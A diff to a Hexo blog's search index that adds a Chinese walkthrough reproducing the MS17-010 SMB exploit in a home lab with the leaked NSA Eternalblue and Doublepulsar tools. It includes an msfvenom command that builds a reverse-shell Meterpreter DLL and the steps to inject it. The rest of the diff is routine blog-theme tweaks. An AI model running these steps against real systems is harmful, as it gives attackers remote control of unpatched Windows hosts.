@@ -3,6 +3,78 @@
   
     
     <entry>
+      <title><![CDATA[NSA Enternalblue + Doublepulsar 复现 MS17-010]]></title>
+      <url>/NSA%20Enternalblue%20+%20Doublepulsar%20%E5%A4%8D%E7%8E%B0%20MS17-010/</url>
+      <content type="html"><![CDATA[<p>2017年4月14日，Shadow Brokers 再次公开了大量从 NSA 的方程式组织（Equation Group）处窃取的攻击工具，这些工具主要针对 Windows 系统的漏洞，其中还有几个 0 day。工具中的 fuzzbunch 是一个类似于 metasploit 的漏洞利用框架，fb.py 是 fuzzbunch 的入口文件，通过该文件可以调用各攻击模块。</p>
+<p>泄露的工具可在 Github 下载：<a href="https://github.com/misterch0c/shadowbroker" target="_blank" rel="external">https://github.com/misterch0c/shadowbroker</a></p>
+<h3 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a><strong>0x01 影响范围</strong></h3><p>下图中列举了工具中相关模块所影响的服务和系统。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/92526918-file_1493343199647_16966.jpg" alt=""></p>
+<h3 id="0x02-漏洞测试"><a href="#0x02-漏洞测试" class="headerlink" title="0x02 漏洞测试"></a><strong>0x02 漏洞测试</strong></h3><p>下面使用工具中的 fuzzbunch 框架、Eternalblue 和 Doublepulsar 测试 Windows 下的 SMB 漏洞。首先通过 Eternalblue 利用 MS17-010 漏洞攻击 Windows 系统；然后在 Kali Linux 中用 Metasploit 生成一个能建立反向连接的 DLL，并在 Kali 中监听相应端口；最后使用 Doublepulsar 远程注入恶意 DLL 到目标系统，注入成功后 Kali 将与目标系统建立连接。</p>
+<h4 id="1-测试环境"><a href="#1-测试环境" class="headerlink" title="1. 测试环境"></a><strong>1. 测试环境</strong></h4><table>
+<thead>
+<tr>
+<th style="text-align:left">PC</th>
+<th style="text-align:left">IP</th>
+<th>用途</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Win 7 x64</td>
+<td style="text-align:left">192.168.109.1</td>
+<td>攻击机</td>
+<td>需安装 <a href="https://www.python.org/ftp/python/2.6.6/python-2.6.6.msi" target="_blank" rel="external">python2.6</a>  和 <a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download" target="_blank" rel="external">pywin32</a></td>
+</tr>
+<tr>
+<td style="text-align:left">Win 7 x86</td>
+<td style="text-align:left">192.168.109.132</td>
+<td>靶机</td>
+<td>开启 SMB 服务（445端口）</td>
+</tr>
+<tr>
+<td style="text-align:left">Kali Linux</td>
+<td style="text-align:left">192.168.109.128</td>
+<td>控制端</td>
+<td>生成payload 并控制回连会话</td>
+</tr>
+</tbody>
+</table>
+<p>首先需要把工具中的 windows 拷贝到攻击机 Win 7 x64中，然后在 windows 目录下新建一个 listeningposts 文件夹。</p>
+<h4 id="2-测试流程"><a href="#2-测试流程" class="headerlink" title="2. 测试流程"></a><strong>2. 测试流程</strong></h4><h5 id="1）运行-fuzzbunch-框架"><a href="#1）运行-fuzzbunch-框架" class="headerlink" title="1）运行 fuzzbunch 框架"></a><strong>1）运行 fuzzbunch 框架</strong></h5><p>在 cmd 中进入 windows 目录，运行 <code>python fb.py</code>。输入目标系统 IP（Win 7 x86）和攻击机 IP（Win 7 x64），输入“no” 不重定向，接着输入项目名新建一个项目。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/95094523-file_1493344655277_8614.png" alt=""></p>
+<h5 id="2）调用-Eternalblue-攻击系统"><a href="#2）调用-Eternalblue-攻击系统" class="headerlink" title="2）调用 Eternalblue 攻击系统"></a><strong>2）调用 Eternalblue 攻击系统</strong></h5><p>运行<code>use Eternalblue</code>，然后大多数步骤只需按回车使用默认参数即可。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/54184530-file_1493344922256_adf5.png" alt=""><br>下面需要选择 <code>1）FB</code> 模式。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/61786740-file_1493345114952_f2f3.png" alt=""><br>接着继续回车，直到成功运行攻击模块。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/73280707-file_1493345362094_157db.png" alt=""></p>
+<h5 id="3）Metasploit-生成恶意-DLL"><a href="#3）Metasploit-生成恶意-DLL" class="headerlink" title="3）Metasploit 生成恶意 DLL"></a><strong>3）Metasploit 生成恶意 DLL</strong></h5><p>在 Kali Linux 下使用 Metasploit 生成恶意 DLL,它将在目标系统中建立一个反向连接。这里生成的 DLL必须要与目标系统版本一致，下面生成 32 bit 的 DLL。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.109.128 LPORT=6666 -f dll &gt; test.dll</div></pre></td></tr></table></figure></p>
+<p>之后需要将生成的 test.dll 拷贝到攻击机的 D:\下。</p>
+<h5 id="4）开启-msf-监听"><a href="#4）开启-msf-监听" class="headerlink" title="4）开启 msf 监听"></a><strong>4）开启 msf 监听</strong></h5><p>在 Kali Linux 下，运行 msf，监听 6666 端口。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/80220500-file_1493346556508_101d9.png" alt=""></p>
+<h5 id="5）调用-Doublepulsar-注入-DLL"><a href="#5）调用-Doublepulsar-注入-DLL" class="headerlink" title="5）调用 Doublepulsar 注入 DLL"></a><strong>5）调用 Doublepulsar 注入 DLL</strong></h5><p>回到攻击机中，执行 <code>use Doublepulsar</code> ，回车使用默认参数直到选择 Function 为2 注入 DLL，然后指定 DLL 的路径。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/11038492-file_1493347262266_5c5.png" alt=""><br>注入成功后将返回如下信息。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/68357990-file_1493347997057_2e1f.png" alt=""><br>但是这里也会出现个问题，多次注入之后目标系统会出错重启。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/56721083-file_1493348716416_6f00.png" alt=""></p>
+<h5 id="6）建立连接"><a href="#6）建立连接" class="headerlink" title="6）建立连接"></a><strong>6）建立连接</strong></h5><p>DLL 注入到目标系统之后，Kali Linux 将与目标系统建立连接。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/82624178-file_1493348105266_34db.png" alt=""></p>
+<hr>
+<p>References:<br>[1] NSA工具包之0day Eternalblue 复现笔记：<a href="http://blog.injectxx.com/2017/04/18/%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0%E3%80%82/" target="_blank" rel="external">http://blog.injectxx.com/2017/04/18/%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0%E3%80%82/</a><br>[2] HOW TO EXPLOIT ETERNALBLUE &amp; DOUBLEPULSAR TO GET AN<br>EMPIRE/METERPRETER SESSION ON WINDOWS 7/2008：<a href="https://www.exploit-db.com/docs/41896.pdf" target="_blank" rel="external">https://www.exploit-db.com/docs/41896.pdf</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> Exploit </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> Enternalblue </tag>
+            
+            <tag> Doublepulsar </tag>
+            
+            <tag> NSA </tag>
+            
+            <tag> SMB </tag>
+            
+            <tag> Metasploit </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[Github+Hexo+NexT搭建个人博客]]></title>
       <url>/Github+Hexo+NexT%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
       <content type="html"><![CDATA[<p>平时在网上查文档的时候经常能看到一些非常好的博客，然后就想着自己也搭一个，一方面可以记录一些问题的解决方法，以便查阅，另一方面希望能促使自己多总结，多写文档。所以，经过这几天的折腾，终于把基本功能都搭好了。下面是搭建过程的记录，以下操作在 ubuntu14.04 x86_64中进行。</p>
@@ -66,6 +138,7 @@
 <h4 id="设置分类"><a href="#设置分类" class="headerlink" title="设置分类"></a><strong>设置分类</strong></h4><p>修改站点配置文件中category_map 字段设置分类名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># Category &amp; Tag</div><div class="line">default_category: uncategorized</div><div class="line">category_map:</div><div class="line">  Category1:</div><div class="line">  Category2:</div><div class="line">  Category3:</div><div class="line">tag_map:</div></pre></td></tr></table></figure></p>
 <h4 id="设置代码高亮"><a href="#设置代码高亮" class="headerlink" title="设置代码高亮"></a><strong>设置代码高亮</strong></h4><p>修改站点配置文件中 highlight_theme 字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">highlight_theme: night bright</div></pre></td></tr></table></figure></p>
 <h4 id="修改文章内链样式"><a href="#修改文章内链样式" class="headerlink" title="修改文章内链样式"></a><strong>修改文章内链样式</strong></h4><p>将内链设置为蓝色，鼠标选中时显示下划线。在 <code>themes/next/source/css/_custom/custom.styl</code> 中添加如下样式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.post-body p a &#123;</div><div class="line">  color: #0593d3;</div><div class="line">  border-bottom: none;</div><div class="line">  &amp;:hover &#123;</div><div class="line">    color: #0477ab;</div><div class="line">    text-decoration: underline;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h4 id="图片居中"><a href="#图片居中" class="headerlink" title="图片居中"></a><strong>图片居中</strong></h4><p>修改<code>/themes/next/source/css/_schemes/Mist/</code>目录下的 _posts-expanded.styl。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">.post-body img &#123; margin: 0 ; &#125;</div><div class="line">改为</div><div class="line">.post-body img &#123; margin: 0 auto; &#125;</div></pre></td></tr></table></figure></p>
 <h4 id="设置站点logo"><a href="#设置站点logo" class="headerlink" title="设置站点logo"></a><strong>设置站点logo</strong></h4><p>通过网站 favicon 在线制作制作 favicon 图片，把图片放在<code>/themes/next/source/image</code> 目录中，然后修改主题配置文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">favicon: images/favicon.ico</div></pre></td></tr></table></figure></p>
 <h4 id="首页文章摘要"><a href="#首页文章摘要" class="headerlink" title="首页文章摘要"></a><strong>首页文章摘要</strong></h4><p>在首页只显示文章部分摘要，点击 “Read more” 查看全文。修改主题配置文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">auto_excerpt:</div><div class="line">  enable: true</div><div class="line">  length: 150</div></pre></td></tr></table></figure></p>
 <h4 id="更改内容区域的宽度"><a href="#更改内容区域的宽度" class="headerlink" title="更改内容区域的宽度"></a><strong>更改内容区域的宽度</strong></h4><p>编辑主题的 <code>source/css/_variables/custom.styl</code> 文件，新增变量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">// change width when width of screen &lt; 1600px</div><div class="line">$content-desktop = 800px</div><div class="line">// change width when width of screen &gt;= 1600px</div><div class="line">$content-desktop-large = 1000px</div></pre></td></tr></table></figure></p>
@@ -108,7 +181,7 @@
 <h4 id="3）push-到远程分支"><a href="#3）push-到远程分支" class="headerlink" title="3）push 到远程分支"></a><strong>3）push 到远程分支</strong></h4><p>将修改好主题后 push 到远程分支。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git commit -am &quot;update theme&quot;</div><div class="line">git push origin</div></pre></td></tr></table></figure></p>
 <h4 id="4）恢复主题"><a href="#4）恢复主题" class="headerlink" title="4）恢复主题"></a><strong>4）恢复主题</strong></h4><p>在需要恢复主题时，执行如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git submodule init</div><div class="line">git submodule update</div></pre></td></tr></table></figure></p>
 <hr>
-<p>Reference:<br>Hexo 官方文档：<a href="https://hexo.io/zh-cn/docs/setup.html" target="_blank" rel="external">https://hexo.io/zh-cn/docs/setup.html</a><br>NexT 主题官网：<a href="http://theme-next.iissnan.com/" target="_blank" rel="external">http://theme-next.iissnan.com/</a><br>Hexo-GitHub Page 博客绑定域名：<a href="http://ccxxmd.me/2017/03/04/Blog_domainname/" target="_blank" rel="external">http://ccxxmd.me/2017/03/04/Blog_domainname/</a><br>推荐网易云跟帖：<a href="https://blog.vadxq.com/dstogentie/" target="_blank" rel="external">https://blog.vadxq.com/dstogentie/</a><br>Hexo Next 主题 SEO 优化：<a href="http://fanjun.im/2016/09/hexo_next_seo.html" target="_blank" rel="external">http://fanjun.im/2016/09/hexo_next_seo.html</a><br>Hexo 博客备份：<a href="http://nhsensation.xyz/2016/03/14/move-blog/" target="_blank" rel="external">http://nhsensation.xyz/2016/03/14/move-blog/</a><br>备份 Hexo 源文件至 GitHub：<a href="http://www.leyar.me/backup-your-blog-to-github/" target="_blank" rel="external">http://www.leyar.me/backup-your-blog-to-github/</a></p>
+<p>Reference:<br>[1] Hexo 官方文档：<a href="https://hexo.io/zh-cn/docs/setup.html" target="_blank" rel="external">https://hexo.io/zh-cn/docs/setup.html</a><br>[2] NexT 主题官网：<a href="http://theme-next.iissnan.com/" target="_blank" rel="external">http://theme-next.iissnan.com/</a><br>[3] Hexo-GitHub Page 博客绑定域名：<a href="http://ccxxmd.me/2017/03/04/Blog_domainname/" target="_blank" rel="external">http://ccxxmd.me/2017/03/04/Blog_domainname/</a><br>[4] 推荐网易云跟帖：<a href="https://blog.vadxq.com/dstogentie/" target="_blank" rel="external">https://blog.vadxq.com/dstogentie/</a><br>[5] Hexo Next 主题 SEO 优化：<a href="http://fanjun.im/2016/09/hexo_next_seo.html" target="_blank" rel="external">http://fanjun.im/2016/09/hexo_next_seo.html</a><br>[6] Hexo 博客备份：<a href="http://nhsensation.xyz/2016/03/14/move-blog/" target="_blank" rel="external">http://nhsensation.xyz/2016/03/14/move-blog/</a><br>[7] 备份 Hexo 源文件至 GitHub：<a href="http://www.leyar.me/backup-your-blog-to-github/" target="_blank" rel="external">http://www.leyar.me/backup-your-blog-to-github/</a></p>
 ]]></content>
       
         <categories>
@@ -238,7 +311,7 @@
 <h4 id="2）撰写文章"><a href="#2）撰写文章" class="headerlink" title="2）撰写文章"></a><strong>2）撰写文章</strong></h4><p>使用 Atom 和 Markdown 语法写文章内容。</p>
 <h4 id="3）发布文章"><a href="#3）发布文章" class="headerlink" title="3）发布文章"></a><strong>3）发布文章</strong></h4><p>首先需要生成静态文件，然后部署到Hexo中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">hexo clean  # 清除缓存文件 (db.json) 和已生成的静态文件 (public)</div><div class="line">hexo g      # 生成静态文件</div><div class="line">hexo d      # 部署网站</div></pre></td></tr></table></figure></p>
 <hr>
-<p>References:<br>Markdown 官网语法说明：<a href="http://www.markdown.cn/" target="_blank" rel="external">http://www.markdown.cn/</a></p>
+<p>References:<br>[1] Markdown 官网语法说明：<a href="http://www.markdown.cn/" target="_blank" rel="external">http://www.markdown.cn/</a></p>
 ]]></content>
       
         <categories>
